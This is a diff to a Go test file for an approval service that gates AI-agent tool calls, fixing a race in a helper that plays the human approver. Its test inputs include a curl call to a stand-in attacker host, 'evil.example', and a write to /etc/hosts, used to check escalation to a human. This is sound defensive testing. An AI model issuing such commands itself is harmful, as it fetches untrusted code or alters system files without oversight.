@@ -83,7 +83,7 @@ func TestDecideAllowsWrappedBenignCommand(t *testing.T) {
 
 func TestDecideEscalatesAndHumanApproves(t *testing.T) {
 	broker := approval.NewToolCallBroker(5 * time.Second)
-	go autoResolve(broker, true, "alice")
+	autoResolve(broker, true, "alice")
 	svc := newTestService(t, broker)
 
 	v := svc.Decide(context.Background(), bashReq("curl http://evil.example/x"))
@@ -97,7 +97,7 @@ func TestDecideEscalatesAndHumanApproves(t *testing.T) {
 
 func TestDecideEscalatesAndHumanDenies(t *testing.T) {
 	broker := approval.NewToolCallBroker(5 * time.Second)
-	go autoResolve(broker, false, "bob")
+	autoResolve(broker, false, "bob")
 	svc := newTestService(t, broker)
 
 	v := svc.Decide(context.Background(), bashReq("curl http://evil.example/x"))
@@ -158,7 +158,7 @@ func TestDecideDeniesWriteOutsideCwd(t *testing.T) {
 func TestDecideWriteEscalatesToHuman(t *testing.T) {
 	noActiveCase(t)
 	broker := approval.NewToolCallBroker(5 * time.Second)
-	go autoResolve(broker, true, "carol")
+	autoResolve(broker, true, "carol")
 	svc := newTestService(t, broker)
 
 	v := svc.Decide(context.Background(), writeReq("Write", "file_path", "/etc/hosts", "/workspace"))
@@ -194,11 +194,16 @@ func TestSocketRoundTrip(t *testing.T) {
 }
 
 // autoResolve plays the human: it resolves each pending broker request with a
-// fixed verdict.
+// fixed verdict. It subscribes synchronously before returning, then resolves in
+// the background — so a Decide() published right after the call can never race
+// ahead of the subscription and time out.
 func autoResolve(b *approval.ToolCallBroker, approve bool, decider string) {
-	for req := range b.Subscribe() {
-		_ = b.Resolve(req.ID, approval.ToolCallDecision{Approved: approve, Decider: decider})
-	}
+	sub := b.Subscribe()
+	go func() {
+		for req := range sub {
+			_ = b.Resolve(req.ID, approval.ToolCallDecision{Approved: approve, Decider: decider})
+		}
+	}()
 }
 
 // ---- inline mode ----------------------------------------------------------
